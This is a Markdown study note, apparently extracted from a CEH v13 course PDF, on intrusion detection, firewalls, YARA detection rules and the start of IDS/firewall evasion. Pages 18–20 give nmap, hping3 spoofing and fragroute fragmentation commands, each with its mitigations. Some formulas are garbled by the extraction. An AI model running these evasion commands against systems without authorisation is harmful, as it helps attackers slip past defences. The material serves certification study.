# 📜 07. Full PDF Reference — Evading IDS, Firewalls, and Honeypots

> [!INFO] 🏛️ **Official CEH v13 PDF Source Master Repository**
> Cleaned, high-readability technical text extraction directly from official CEH v13 Syllabus PDF (`CEH_v13__Module_12_Evading_IDS_Firewalls_and_Honeypots.pdf`). Formatted as structured Markdown prose with proper paragraphs, section headers, and key term highlights.

---

## 📊 Syllabus Metadata & Source Breakdown

> [!ABSTRACT] 📋 **Comprehensive PDF Syllabus Metadata Reference Matrix**

| Metadata Attribute | Syllabus Parameter Value |
| :--- | :--- |
| **Course Module** | **Module 12: Evading IDS, Firewalls, and Honeypots** |
| **Source PDF File** | `CEH_v13__Module_12_Evading_IDS_Firewalls_and_Honeypots.pdf` |
| **Total Extracted Pages** | `52 Pages` |
| **Formatting Standard** | Ultra-Readable Markdown Prose & Structured Headings |
| **Extraction Status** | 100% Complete / Verified Text Flow |

---

## 📑 Structured & Readable Syllabus Reference

> [!NOTE]- 📄 **Pages 1 to 5 Syllabus Content**
>
> ### 📍 Page 1
>
> 
> #### 🔹 🛡
> 
> 
> 
> #### 🔹 IDS, Firewalls, and Honeypots
> 
> 
> 
> #### 🔹 Evading IDS, Firewalls, and Honeypots
> 
> 
> 
> #### 🔹 📋Module Overview
> 
> 
> This module covers intrusion detection systems IDS, intrusion prevention systems IPS, firewalls, and honeypots. Topics include detection mechanisms, firewall architectures, evasion techniques (fragmentation, tunneling, encoding), bypassing NAC and endpoint security, evading tools, honeypot concepts, detection methods, and comprehensive defensive countermeasures.
> 
> 
> #### 🔹 1. IDS, IPS, and Firewall Concepts
> 
> 
> 
> #### 🔹 1.1 Intrusion Detection System (IDS)
> 
> 
> 
> #### 🔹 🔍Intrusion Detection System IDS
> 
> 
> A security mechanism that monitors network or host activities to detect malicious, anomalous, or policy-violating behavior.
> 
> 
> #### 🔹 Primary Purpose:
> 
> 
> 
> #### 🔹 Detect attacks  Identify malicious activity
> 
> 
> 
> #### 🔹 Log suspicious activity  Record security events
> 
> 
> 
> #### 🔹 Alert administrators  Notify security teams
> 
>
> ---
>
> ### 📍 Page 2
>
> 
> #### 🔹 Provide visibility  Monitor network/host behavior
> 
> 
> 
> #### 🔹 Support forensics  Collect evidence for investigation
> 
> 
> 
> #### 🔹 IDS Characteristics:
> 
> 
> 
> #### 🔹 Passive monitoring (typically)
> 
> 
> 
> #### 🔹 Does not block traffic
> 
> 
> 
> #### 🔹 Generates alerts
> 
> 
> 
> #### 🔹 Can be inline or out-of-band
> 
> 
> 
> #### 🔹 Focus on detection accuracy
> 
> 
> 
> #### 🔹 1.2 Intrusion Prevention System (IPS)
> 
> 
> 
> #### 🔹 🛑Intrusion Prevention System IPS
> 
> 
> Active defense system that detects AND blocks attacks in real-time by sitting inline in the network path.
> 
> 
> #### 🔹 IDS vs IPS Comparison:
> 
> 
> 
> #### 🔹 Feature IDS IPS
> 
> 
> 
> #### 🔹 Action Detects Detects  Blocks
> 
> 
> 
> #### 🔹 Placement Inline or passive Inline only
> 
> 
> False positives impact Alerts only Can block legitimate traffic
> 
> 
> #### 🔹 Response Notification Prevention
> 
> 
> 
> #### 🔹 Performance Minimal impact Can introduce latency
> 
> 
> 
> #### 🔹 Risk Missed detectionsBlocking legitimate users
> 
> 
> 
> #### 🔹 IPS Capabilities:
> 
> 
> 
> #### 🔹 Real-time blocking
> 
> 
> 
> #### 🔹 Automated response
> 
> 
> 
> #### 🔹 Inline traffic inspection
> 
> 
> 
> #### 🔹 Protocol anomaly detection
> 
> 
> 
> #### 🔹 Attack mitigation
> 
>
> ---
>
> ### 📍 Page 3
>
> 
> #### 🔹 1.3 How an IDS Detects Intrusion
> 
> 
> 
> #### 🔹 Detection Mechanisms:
> 
> 
> 
> #### 🔹 Signature-Based Detection
> 
> 
> 
> #### 🔹 Match known attack patterns
> 
> 
> 
> #### 🔹 Database of attack signatures
> 
> 
> 
> #### 🔹 Fast and accurate for known threats
> 
> 
> 
> #### 🔹 Cannot detect zero-day attacks
> 
> 
> 
> #### 🔹 Requires regular updates
> 
> 
> 
> #### 🔹 Anomaly-Based Detection
> 
> 
> 
> #### 🔹 Detect behavior deviations from baseline
> 
> 
> 
> #### 🔹 Establish normal behavior profile
> 
> 
> 
> #### 🔹 Alert on statistical anomalies
> 
> 
> 
> #### 🔹 Can detect unknown attacks
> 
> 
> 
> #### 🔹 Higher false positive rate
> 
> 
> 
> #### 🔹 Heuristic/ML-Based Detection
> 
> 
> 
> #### 🔹 Machine learning and AI models
> 
> 
> 
> #### 🔹 Pattern recognition
> 
> 
> 
> #### 🔹 Adaptive learning
> 
> 
> 
> #### 🔹 Predictive analysis
> 
> 
> 
> #### 🔹 Evolving threat detection
> 
> 
> 
> #### 🔹 Stateful Protocol Analysis
> 
> 
> 
> #### 🔹 Track protocol state and behavior
> 
> 
> 
> #### 🔹 Validate protocol compliance
> 
> 
> 
> #### 🔹 Detect protocol anomalies
> 
> 
> 
> #### 🔹 Session tracking
> 
> 
> 
> #### 🔹 Identify abuse of legitimate protocols
> 
>
> ---
>
> ### 📍 Page 4
>
> 
> #### 🔹 1.4 General Indications of Intrusions
> 
> 
> 
> #### 🔹 Attack Indicators:
> 
> 
> 
> #### 🔹 Network-Level Indicators:
> 
> 
> 
> #### 🔹 Unexpected port scans  Reconnaissance activity
> 
> 
> 
> #### 🔹 Abnormal outbound traffic  Data exfiltration
> 
> 
> 
> #### 🔹 Suspicious payloads  Malicious packet contents
> 
> 
> 
> #### 🔹 Unexpected traffic spikes  DDoS or scanning
> 
> 
> 
> #### 🔹 Protocol violations  Malformed packets
> 
> 
> 
> #### 🔹 Host-Level Indicators:
> 
> 
> 
> #### 🔹 Failed login bursts  Brute-force attempts
> 
> 
> 
> #### 🔹 Changes in system files  Unauthorized modifications
> 
> 
> 
> #### 🔹 Unexpected processes  Malware execution
> 
> 
> 
> #### 🔹 Privilege escalation attempts  Unauthorized access
> 
> 
> 
> #### 🔹 Registry modifications  Persistence mechanisms
> 
> 
> 
> #### 🔹 Application-Level Indicators:
> 
> 
> 
> #### 🔹 SQL injection attempts  Database attacks
> 
> 
> 
> #### 🔹 XSS payloads  Cross-site scripting
> 
> 
> 
> #### 🔹 Command injection  OS command execution
> 
> 
> 
> #### 🔹 File upload anomalies  Malicious file uploads
> 
> 
> 
> #### 🔹 1.5 Types of IDS
> 
> 
> 
> #### 🔹 IDS Classifications:
> 
> 
> 
> #### 🔹 Network-Based IDS (NIDS)
> 
> 
> 
> #### 🔹 Monitor network traffic
> 
> 
> 
> #### 🔹 Deployed at strategic network points
> 
> 
> 
> #### 🔹 Analyzes packet flows
> 
> 
> 
> #### 🔹 Detects network-based attacks
> 
> 
> 
> #### 🔹 Examples: Snort, Suricata
> 
>
> ---
>
> ### 📍 Page 5
>
> 
> #### 🔹 Host-Based IDS (HIDS)
> 
> 
> 
> #### 🔹 Monitor individual hosts
> 
> 
> 
> #### 🔹 Installed on endpoints
> 
> 
> 
> #### 🔹 Monitors system calls, logs, file integrity
> 
> 
> 
> #### 🔹 Detects local attacks
> 
> 
> 
> #### 🔹 Examples: OSSEC, Tripwire
> 
> 
> 
> #### 🔹 Protocol-Based IDS (PIDS)
> 
> 
> 
> #### 🔹 Monitor specific protocols
> 
> 
> 
> #### 🔹 Web server monitoring
> 
> 
> 
> #### 🔹 Database protocol analysis
> 
> 
> 
> #### 🔹 API traffic inspection
> 
> 
> 
> #### 🔹 Application-Based IDS (AIDS)
> 
> 
> 
> #### 🔹 Monitor application behavior
> 
> 
> 
> #### 🔹 Application-specific monitoring
> 
> 
> 
> #### 🔹 API abuse detection
> 
> 
> 
> #### 🔹 Business logic attacks
> 
> 
> 
> #### 🔹 Hybrid IDS
> 
> 
> 
> #### 🔹 Combines multiple detection methods
> 
> 
> 
> #### 🔹 Network + host monitoring
> 
> 
> 
> #### 🔹 Signature + anomaly detection
> 
> 
> 
> #### 🔹 Comprehensive coverage
> 
> 
> 
> #### 🔹 1.6 Types of IDS Alerts
> 
> 
> 
> #### 🔹 Alert Classification:
> 
> 
> 
> #### 🔹 🎯IDS Alert Types
> 
> 
> Understanding false positives and false negatives is critical for effective IDS tuning and security operations.
>
> ---
>

> [!NOTE]- 📄 **Pages 6 to 10 Syllabus Content**
>
> ### 📍 Page 6
>
> 
> #### 🔹 True Positive TP
> 
> 
> 
> #### 🔹 Attack detected and actually exists
> 
> 
> 
> #### 🔹 Correct detection
> 
> 
> 
> #### 🔹 Requires incident response
> 
> 
> 
> #### 🔹 False Positive FP
> 
> 
> 
> #### 🔹 Benign event flagged as attack
> 
> 
> 
> #### 🔹 Incorrect alert
> 
> 
> 
> #### 🔹 Causes alert fatigue
> 
> 
> 
> #### 🔹 Requires tuning
> 
> 
> 
> #### 🔹 True Negative TN
> 
> 
> 
> #### 🔹 No attack, no alert
> 
> 
> 
> #### 🔹 Correct operation
> 
> 
> 
> #### 🔹 Normal baseline
> 
> 
> 
> #### 🔹 False Negative FN
> 
> 
> 
> #### 🔹 Attack exists but not detected
> 
> 
> 
> #### 🔹 Most dangerous scenario
> 
> 
> 
> #### 🔹 Security breach undetected
> 
> 
> 
> #### 🔹 Requires improved detection rules
> 
> 
> 
> #### 🔹 Metrics:
> 
> 
> 
> #### 🔹 Detection Rate  TP / TP  FN
> 
> 
> 
> #### 🔹 False Alarm Rate  FP / FP  TN
> 
> 
> 
> #### 🔹 Accuracy = TP  TN / TP  TN  FP  FN
> 
> 
> 
> #### 🔹 1.7 Firewall
> 
> 
> 
> #### 🔹 🔥Firewall Definition
> 
> 
> Traffic filtering system that enforces security policies between networks, controlling inbound and outbound connections based on predefined rules.
>
> ---
>
> ### 📍 Page 7
>
> 
> #### 🔹 Firewall Functions:
> 
> 
> 
> #### 🔹 Packet filtering  Allow/deny based on rules
> 
> 
> 
> #### 🔹 Traffic inspection  Analyze packet contents
> 
> 
> 
> #### 🔹 Policy enforcement  Implement security policies
> 
> 
> 
> #### 🔹 Network segmentation  Separate network zones
> 
> 
> 
> #### 🔹 Logging and reporting  Audit trail
> 
> 
> 
> #### 🔹 Firewall Placement:
> 
> 
> 
> #### 🔹 Perimeter Internet gateway)
> 
> 
> 
> #### 🔹 Internal segmentation
> 
> 
> 
> #### 🔹 Host-based (software firewall)
> 
> 
> 
> #### 🔹 DMZ boundaries
> 
> 
> 
> #### 🔹 1.8 Firewall Architecture
> 
> 
> 
> #### 🔹 Typical Components:
> 
> 
> 
> #### 🔹 Screening Router
> 
> 
> 
> #### 🔹 First line of defense
> 
> 
> 
> #### 🔹 Basic packet filtering
> 
> 
> 
> #### 🔹 Simple ACL rules
> 
> 
> 
> #### 🔹 High performance
> 
> 
> 
> #### 🔹 Proxy Server
> 
> 
> 
> #### 🔹 Application-level gateway
> 
> 
> 
> #### 🔹 Acts as intermediary
> 
> 
> 
> #### 🔹 Content filtering
> 
> 
> 
> #### 🔹 Caching capabilities
> 
> 
> 
> #### 🔹 Bastion Host
> 
> 
> 
> #### 🔹 Hardened security system
> 
> 
> 
> #### 🔹 Directly exposed to untrusted networks
> 
> 
> 
> #### 🔹 Minimal services running
> 
>
> ---
>
> ### 📍 Page 8
>
> 
> #### 🔹 Heavily monitored
> 
> 
> 
> #### 🔹 DMZ Perimeter Zone
> 
> 
> 
> #### 🔹 Semi-trusted network segment
> 
> 
> 
> #### 🔹 Hosts public-facing services
> 
> 
> 
> #### 🔹 Isolated from internal network
> 
> 
> 
> #### 🔹 Additional security layer
> 
> 
> 
> #### 🔹 Typical Architecture:
> 
> 
> Internet  Screening Router  External Firewall  DMZ  Internal Firewall
> 
> 
> #### 🔹  Internal Network
> 
> 
> 
> #### 🔹 1.9 Demilitarized Zone (DMZ)
> 
> 
> 
> #### 🔹 🏰DMZ Demilitarized Zone)
> 
> 
> Isolated subnetwork hosting public-facing services (web servers, mail servers, DNS to minimize exposure of the internal network.
> 
> 
> #### 🔹 DMZ Purpose:
> 
> 
> 
> #### 🔹 Protect internal network
> 
> 
> 
> #### 🔹 Host public services
> 
> 
> 
> #### 🔹 Add security buffer
> 
> 
> 
> #### 🔹 Limit breach impact
> 
> 
> 
> #### 🔹 Common DMZ Services:
> 
> 
> 
> #### 🔹 Web servers HTTP/HTTPS
> 
> 
> 
> #### 🔹 Mail servers SMTP
> 
> 
> 
> #### 🔹 DNS servers
> 
> 
> 
> #### 🔹 FTP servers
> 
> 
> 
> #### 🔹 VPN gateways
> 
> 
> 
> #### 🔹 Reverse proxies
> 
>
> ---
>
> ### 📍 Page 9
>
> 
> #### 🔹 DMZ Configuration:
> 
> 
> 
> #### 🔹 Internet
> 
> 
> 
> #### 🔹 ↓
> 
> 
> 
> #### 🔹 External Firewall
> 
> 
> 
> #### 🔹 ↓
> 
> 
> 
> #### 🔹 DMZ Public Services)
> 
> 
> 
> #### 🔹 ↓
> 
> 
> 
> #### 🔹 Internal Firewall
> 
> 
> 
> #### 🔹 ↓
> 
> 
> 
> #### 🔹 Internal Network Private)
> 
> 
> 
> #### 🔹 1.10 Types of Firewalls
> 
> 
> 
> #### 🔹 Based on Configuration
> 
> 
> 
> #### 🔹 Packet Filtering Firewall
> 
> 
> 
> #### 🔹 ACL-based filtering
> 
> 
> 
> #### 🔹 Layer 3/4 inspection
> 
> 
> 
> #### 🔹 Fast performance
> 
> 
> 
> #### 🔹 Stateless operation
> 
> 
> 
> #### 🔹 Proxy Firewall
> 
> 
> 
> #### 🔹 Application-level gateway
> 
> 
> 
> #### 🔹 Full packet inspection
> 
> 
> 
> #### 🔹 User authentication
> 
> 
> 
> #### 🔹 Content filtering
> 
> 
> 
> #### 🔹 Stateful Firewall
> 
> 
> 
> #### 🔹 Tracks connection state
> 
> 
> 
> #### 🔹 Context-aware filtering
> 
> 
> 
> #### 🔹 Dynamic rule adaptation
> 
> 
> 
> #### 🔹 Session monitoring
> 
> 
> 
> #### 🔹 Hybrid Firewall
> 
>
> ---
>
> ### 📍 Page 10
>
> 
> #### 🔹 Combines multiple approaches
> 
> 
> 
> #### 🔹 Flexible security
> 
> 
> 
> #### 🔹 Comprehensive protection
> 
> 
> 
> #### 🔹 Based on Working Mechanism
> 
> 
> 
> #### 🔹 Packet Filtering Firewall Layer 3/4
> 
> 
> 
> #### 🔹 IP address filtering
> 
> 
> 
> #### 🔹 Port-based rules
> 
> 
> 
> #### 🔹 Protocol filtering
> 
> 
> 
> #### 🔹 Simple and fast
> 
> 
> 
> #### 🔹 Circuit-Level Gateway
> 
> 
> 
> #### 🔹 Session/handshake validation
> 
> 
> 
> #### 🔹 TCP handshake verification
> 
> 
> 
> #### 🔹 Virtual circuit creation
> 
> 
> 
> #### 🔹 Examples: SOCKS proxy
> 
> 
> 
> #### 🔹 Application-Level Firewall Layer 7
> 
> 
> 
> #### 🔹 Deep content inspection
> 
> 
> 
> #### 🔹 Application protocol analysis
> 
> 
> 
> #### 🔹 User authentication
> 
> 
> 
> #### 🔹 Advanced filtering
> 
> 
> 
> #### 🔹 Stateful Multilayer Inspection Firewall
> 
> 
> 
> #### 🔹 Combines multiple layers
> 
> 
> 
> #### 🔹 Connection state tracking
> 
> 
> 
> #### 🔹 Protocol validation
> 
> 
> 
> #### 🔹 Performance optimized
> 
> 
> 
> #### 🔹 Next-Generation Firewall NGFW
> 
> 
> 
> #### 🔹 Modern comprehensive firewall with:
> 
> 
> 
> #### 🔹 Deep Packet Inspection DPI  Full payload analysis
> 
>
> ---
>

> [!NOTE]- 📄 **Pages 11 to 15 Syllabus Content**
>
> ### 📍 Page 11
>
> 
> #### 🔹 SSL/TLS inspection  Encrypted traffic analysis
> 
> 
> 
> #### 🔹 Application identification  App-aware filtering
> 
> 
> 
> #### 🔹 Intrusion prevention  Integrated IPS
> 
> 
> 
> #### 🔹 User identity awareness  User-based policies
> 
> 
> 
> #### 🔹 Threat intelligence  Cloud-based updates
> 
> 
> 
> #### 🔹 Sandboxing  Malware analysis
> 
> 
> 
> #### 🔹 1.11 Network Address Translation (NAT)
> 
> 
> 
> #### 🔹 NAT Functionality:
> 
> 
> 
> #### 🔹 🔄Network Address Translation NAT
> 
> 
> Translates private IP addresses to public IP addresses, hiding internal network structure and conserving public IP addresses.
> 
> 
> #### 🔹 NAT Types:
> 
> 
> 
> #### 🔹 Static NAT
> 
> 
> 
> #### 🔹 One-to-one mapping
> 
> 
> 
> #### 🔹 Permanent translation
> 
> 
> 
> #### 🔹 Public server hosting
> 
> 
> 
> #### 🔹 Dynamic NAT
> 
> 
> 
> #### 🔹 Pool of public IPs
> 
> 
> 
> #### 🔹 Dynamic allocation
> 
> 
> 
> #### 🔹 Temporary mappings
> 
> 
> 
> #### 🔹 PAT Port Address Translation)
> 
> 
> 
> #### 🔹 Many-to-one with port mapping
> 
> 
> 
> #### 🔹 Most common implementation
> 
> 
> 
> #### 🔹 Overload/masquerading
> 
> 
> 
> #### 🔹 Benefits:
> 
> 
> 
> #### 🔹 IP address conservation
> 
>
> ---
>
> ### 📍 Page 12
>
> 
> #### 🔹 Internal network hiding
> 
> 
> 
> #### 🔹 Security through obscurity
> 
> 
> 
> #### 🔹 Simplified internal addressing
> 
> 
> 
> #### 🔹 1.12 VPN
> 
> 
> 
> #### 🔹 Virtual Private Network:
> 
> 
> 
> #### 🔹 VPN Purpose:
> 
> 
> 
> #### 🔹 Secure encrypted tunnels over public networks
> 
> 
> 
> #### 🔹 Remote access connectivity
> 
> 
> 
> #### 🔹 Site-to-site connections
> 
> 
> 
> #### 🔹 Privacy and anonymity
> 
> 
> 
> #### 🔹 VPN Protocols:
> 
> 
> 
> #### 🔹 IPsec  Network-layer encryption
> 
> 
> 
> #### 🔹 SSL/TLS  Application-layer VPN
> 
> 
> 
> #### 🔹 OpenVPN  Open-source SSL VPN
> 
> 
> 
> #### 🔹 WireGuard  Modern, lightweight VPN
> 
> 
> 
> #### 🔹 L2TP/IPsec  Layer 2 tunneling
> 
> 
> 
> #### 🔹 PPTP  Legacy protocol (insecure)
> 
> 
> 
> #### 🔹 VPN Types:
> 
> 
> 
> #### 🔹 Remote Access VPN  Connect individual users
> 
> 
> 
> #### 🔹 Site-to-Site VPN  Connect entire networks
> 
> 
> 
> #### 🔹 SSL VPN  Browser-based access
> 
> 
> 
> #### 🔹 MPLS VPN  Service provider VPN
> 
> 
> 
> #### 🔹 1.13 Firewall Limitations
> 
> 
> 
> #### 🔹 Firewall Cannot:
> 
> 
> 
> #### 🔹 Internal Attacks
> 
> 
> 
> #### 🔹 Cannot detect insider threats
> 
> 
> 
> #### 🔹 No visibility into internal lateral movement
> 
>
> ---
>
> ### 📍 Page 13
>
> 
> #### 🔹 Users within network bypass firewall
> 
> 
> 
> #### 🔹 Encryption Misuse
> 
> 
> Cannot inspect fully encrypted traffic (without SSL inspection)
> 
> 
> #### 🔹 Attackers use encrypted channels
> 
> 
> 
> #### 🔹 Tunneling through allowed protocols
> 
> 
> 
> #### 🔹 Application-Level Attacks
> 
> 
> 
> #### 🔹 Cannot prevent application logic flaws
> 
> 
> 
> #### 🔹 SQL injection, XSS through allowed ports
> 
> 
> 
> #### 🔹 Zero-day application vulnerabilities
> 
> 
> 
> #### 🔹 Social Engineering
> 
> 
> 
> #### 🔹 Cannot prevent user deception
> 
> 
> 
> #### 🔹 Phishing attacks
> 
> 
> 
> #### 🔹 Malicious insider actions
> 
> 
> 
> #### 🔹 Misconfiguration
> 
> 
> 
> #### 🔹 Overly permissive rules
> 
> 
> 
> #### 🔹 Unused open ports
> 
> 
> 
> #### 🔹 Improper rule ordering
> 
> 
> 
> #### 🔹 Shadow IT bypass
> 
> 
> 
> #### 🔹 Additional Limitations:
> 
> 
> 
> #### 🔹 Performance bottlenecks
> 
> 
> 
> #### 🔹 Single point of failure (without HA
> 
> 
> 
> #### 🔹 Complex management overhead
> 
> 
> 
> #### 🔹 Cannot protect against all threats
> 
> 
> 
> #### 🔹 2. IDS, IPS, and Firewall Solutions
> 
> 
> 
> #### 🔹 2.1 Intrusion Detection using YARA
> 
>
> ---
>
> ### 📍 Page 14
>
> 
> #### 🔹 📝YARA Rules
> 
> 
> Pattern-matching tool for malware identification and threat detection. YARA rules match malware patterns in files, processes, and network traffic.
> 
> 
> #### 🔹 YARA Matching:
> 
> 
> 
> #### 🔹 Strings
> 
> 
> 
> #### 🔹 rule Suspicious_Malware {
> 
> 
> 
> #### 🔹 strings:
> 
> 
> 
> #### 🔹 $a = "malicious_function"
> 
> 
> 
> #### 🔹 $b = "backdoor_command"
> 
> 
> 
> #### 🔹 condition:
> 
> 
> 
> #### 🔹 $a or $b
> 
> 
> 
> #### 🔹 }
> 
> 
> 
> #### 🔹 Binary Sequences
> 
> 
> 
> #### 🔹 rule Binary_Pattern {
> 
> 
> 
> #### 🔹 strings:
> 
> 
> 
> #### 🔹 $hex =  6A 40 68 00 30 00 00 
> 
> 
> 
> #### 🔹 condition:
> 
> 
> 
> #### 🔹 $hex
> 
> 
> 
> #### 🔹 }
> 
> 
> 
> #### 🔹 PE Header Values
> 
> 
> 
> #### 🔹 rule PE_Characteristics {
> 
> 
> 
> #### 🔹 condition:
> 
> 
> 
> #### 🔹 pe.imports("kernel32.dll", "CreateRemoteThread")
> 
> 
> 
> #### 🔹 }
> 
> 
> 
> #### 🔹 Use Cases:
> 
> 
> 
> #### 🔹 Malware detection
> 
> 
> 
> #### 🔹 Threat hunting
> 
> 
> 
> #### 🔹 IDS rule creation
> 
>
> ---
>
> ### 📍 Page 15
>
> 
> #### 🔹 File scanning
> 
> 
> 
> #### 🔹 2.2 Intrusion Detection Tools
> 
> 
> 
> #### 🔹 Popular IDS Solutions:
> 
> 
> 
> #### 🔹 Snort
> 
> 
> 
> #### 🔹 Open-source NIDS
> 
> 
> 
> #### 🔹 Signature-based detection
> 
> 
> 
> #### 🔹 Inline or passive mode
> 
> 
> 
> #### 🔹 Extensive rule database
> 
> 
> 
> #### 🔹 Suricata
> 
> 
> 
> #### 🔹 Modern multi-threaded IDS/IPS
> 
> 
> 
> #### 🔹 High performance
> 
> 
> 
> #### 🔹 Protocol analysis
> 
> 
> 
> #### 🔹 Lua scripting support
> 
> 
> 
> #### 🔹 Zeek (formerly Bro)
> 
> 
> 
> #### 🔹 Network security monitor
> 
> 
> 
> #### 🔹 Protocol analysis
> 
> 
> 
> #### 🔹 Scriptable detection
> 
> 
> 
> #### 🔹 Comprehensive logging
> 
> 
> 
> #### 🔹 OSSEC
> 
> 
> 
> #### 🔹 Host-based IDS
> 
> 
> 
> #### 🔹 Log analysis
> 
> 
> 
> #### 🔹 File integrity monitoring
> 
> 
> 
> #### 🔹 Rootkit detection
> 
> 
> 
> #### 🔹 OSquery
> 
> 
> 
> #### 🔹 SQL-based endpoint visibility
> 
> 
> 
> #### 🔹 Cross-platform monitoring
> 
> 
> 
> #### 🔹 Real-time queries
> 
>
> ---
>

> [!NOTE]- 📄 **Pages 16 to 20 Syllabus Content**
>
> ### 📍 Page 16
>
> 
> #### 🔹 Fleet management
> 
> 
> 
> #### 🔹 Wazuh
> 
> 
> 
> #### 🔹 Open-source security platform
> 
> 
> 
> #### 🔹 HIDS/NIDS capabilities
> 
> 
> 
> #### 🔹 Log analysis
> 
> 
> 
> #### 🔹 Compliance monitoring
> 
> 
> 
> #### 🔹 2.3 Intrusion Prevention Tools
> 
> 
> 
> #### 🔹 IPS Solutions:
> 
> 
> 
> #### 🔹 Suricata Inline Mode)
> 
> 
> 
> #### 🔹 Inline IPS deployment
> 
> 
> 
> #### 🔹 Real-time blocking
> 
> 
> 
> #### 🔹 Multi-threaded performance
> 
> 
> 
> #### 🔹 Palo Alto Threat Prevention
> 
> 
> 
> #### 🔹 NGFW integrated IPS
> 
> 
> 
> #### 🔹 Signature-based prevention
> 
> 
> 
> #### 🔹 Vulnerability protection
> 
> 
> 
> #### 🔹 Anti-spyware
> 
> 
> 
> #### 🔹 Cisco FirePOWER
> 
> 
> 
> #### 🔹 Advanced IPS capabilities
> 
> 
> 
> #### 🔹 Network visibility
> 
> 
> 
> #### 🔹 Malware protection
> 
> 
> 
> #### 🔹 Application control
> 
> 
> 
> #### 🔹 Check Point IPS
> 
> 
> 
> #### 🔹 Enterprise IPS solution
> 
> 
> 
> #### 🔹 Threat prevention
> 
> 
> 
> #### 🔹 Zero-day protection
> 
> 
> 
> #### 🔹 Cloud-based updates
> 
>
> ---
>
> ### 📍 Page 17
>
> 
> #### 🔹 2.4 Firewall Solutions
> 
> 
> 
> #### 🔹 Enterprise Firewalls:
> 
> 
> 
> #### 🔹 FortiGate Fortinet)
> 
> 
> 
> #### 🔹 NGFW capabilities
> 
> 
> 
> #### 🔹 High performance
> 
> 
> 
> #### 🔹 SDWAN integration
> 
> 
> 
> #### 🔹 Security fabric
> 
> 
> 
> #### 🔹 Palo Alto Networks
> 
> 
> 
> #### 🔹 Leading NGFW
> 
> 
> 
> #### 🔹 App-ID technology
> 
> 
> 
> #### 🔹 Threat intelligence
> 
> 
> 
> #### 🔹 Cloud-delivered security
> 
> 
> 
> #### 🔹 Sophos XG Firewall
> 
> 
> 
> #### 🔹 Synchronized security
> 
> 
> 
> #### 🔹 Deep packet inspection
> 
> 
> 
> #### 🔹 Web filtering
> 
> 
> 
> #### 🔹 Sandboxing
> 
> 
> 
> #### 🔹 pfSense
> 
> 
> 
> #### 🔹 Open-source firewall
> 
> 
> 
> #### 🔹 FreeBSD-based
> 
> 
> 
> #### 🔹 Extensible with packages
> 
> 
> 
> #### 🔹 Cost-effective
> 
> 
> 
> #### 🔹 Juniper SRX
> 
> 
> 
> #### 🔹 Enterprise-grade firewall
> 
> 
> 
> #### 🔹 Unified threat management
> 
> 
> 
> #### 🔹 Advanced routing
> 
> 
> 
> #### 🔹 High availability
> 
>
> ---
>
> ### 📍 Page 18
>
> 
> #### 🔹 3. IDS/Firewall Evasion Techniques
> 
> 
> 
> #### 🔹 3.1 IDS/Firewall Identification
> 
> 
> 
> #### 🔹 Reconnaissance Goal:
> 
> 
> 
> #### 🔹 Detect security devices and understand their rules
> 
> 
> 
> #### 🔹 Identification Techniques:
> 
> 
> 
> #### 🔹 Nmap Firewall Detection
> 
> 
> 
> #### 🔹 # Detect firewall presence
> 
> 
> 
> #### 🔹 nmap -sA target.com
> 
> 
> 
> #### 🔹 # Firewall/IDS detection scan
> 
> 
> 
> #### 🔹 nmap -sF -sX -sN target.com
> 
> 
> 
> #### 🔹 # Check firewall rules
> 
> 
> 
> #### 🔹 nmap --script firewalk target.com
> 
> 
> 
> #### 🔹 TTL/Ping Behavior Changes
> 
> 
> 
> #### 🔹 Analyze TTL values
> 
> 
> 
> #### 🔹 ICMP response patterns
> 
> 
> 
> #### 🔹 Packet drop patterns
> 
> 
> 
> #### 🔹 Response time anomalies
> 
> 
> 
> #### 🔹 Error Messages
> 
> 
> 
> #### 🔹 Firewall rejection messages
> 
> 
> 
> #### 🔹 IDS alert patterns
> 
> 
> 
> #### 🔹 Banner grabbing results
> 
> 
> 
> #### 🔹 Port Mapping
> 
> 
> 
> #### 🔹 Identify filtered vs closed ports
> 
> 
> 
> #### 🔹 Stealth scan results
> 
> 
> 
> #### 🔹 ACK scan responses
> 
>
> ---
>
> ### 📍 Page 19
>
> 
> #### 🔹 3.2 IP Address Spoofing
> 
> 
> 
> #### 🔹 Source IP Forgery:
> 
> 
> 
> #### 🔹 🎭IP Address Spoofing
> 
> 
> Forge source IP address to bypass IP-based filters, evade detection, or frame another system.
> 
> 
> #### 🔹 Evasion Use:
> 
> 
> 
> #### 🔹 # Nmap with spoofed IP
> 
> 
> 
> #### 🔹 nmap S spoofed_ip target.com
> 
> 
> 
> #### 🔹 # hping3 IP spoofing
> 
> 
> 
> #### 🔹 hping3 -a spoofed_ip target.com
> 
> 
> 
> #### 🔹 Limitations:
> 
> 
> 
> #### 🔹 Cannot receive responses
> 
> 
> 
> #### 🔹 Effective for one-way attacks
> 
> 
> 
> #### 🔹 Requires knowledge of network topology
> 
> 
> 
> #### 🔹 Modern firewalls use stateful inspection
> 
> 
> 
> #### 🔹 3.3 Source Routing
> 
> 
> 
> #### 🔹 Route Specification Attack:
> 
> 
> 
> #### 🔹 Attacker defines packet route to bypass filtering devices:
> 
> 
> 
> #### 🔹 Loose Source Routing  Specify intermediate hops
> 
> 
> 
> #### 🔹 Strict Source Routing  Exact route specification
> 
> 
> 
> #### 🔹 Evasion Benefit:
> 
> 
> 
> #### 🔹 Route through trusted systems
> 
> 
> 
> #### 🔹 Bypass firewall inspection
> 
> 
> 
> #### 🔹 Evade IDS placement
> 
> 
> 
> #### 🔹 Modern Status:
> 
>
> ---
>
> ### 📍 Page 20
>
> 
> #### 🔹 Mostly blocked by routers
> 
> 
> 
> #### 🔹 Disabled by default
> 
> 
> 
> #### 🔹 Still works on misconfigured systems
> 
> 
> 
> #### 🔹 3.4 Tiny Fragments
> 
> 
> 
> #### 🔹 Fragmentation Evasion:
> 
> 
> 
> #### 🔹 🧩Tiny Fragments
> 
> 
> Split TCP payload into very small fragments so IDS cannot reconstruct and inspect the complete malicious content.
> 
> 
> #### 🔹 Attack Method:
> 
> 
> 
> #### 🔹 # Nmap fragmentation
> 
> 
> 
> #### 🔹 nmap -f target.com
> 
> 
> 
> #### 🔹 # Fragroute fragmentation
> 
> 
> 
> #### 🔹 echo "tcp_seg 8" | fragroute target.com
> 
> 
> 
> #### 🔹 Why Effective:
> 
> 
> 
> #### 🔹 IDS may not reassemble fragments
> 
> 
> 
> #### 🔹 Signature matching fails
> 
> 
> 
> #### 🔹 Resource exhaustion on reassembly
> 
> 
> 
> #### 🔹 Timeout before complete packet
> 
> 
> 
> #### 🔹 Mitigation:
> 
> 
> 
> #### 🔹 Fragment reassembly at IDS
> 
> 
> 
> #### 🔹 Fragment timeout policies
> 
> 
> 
> #### 🔹 Drop suspicious fragments
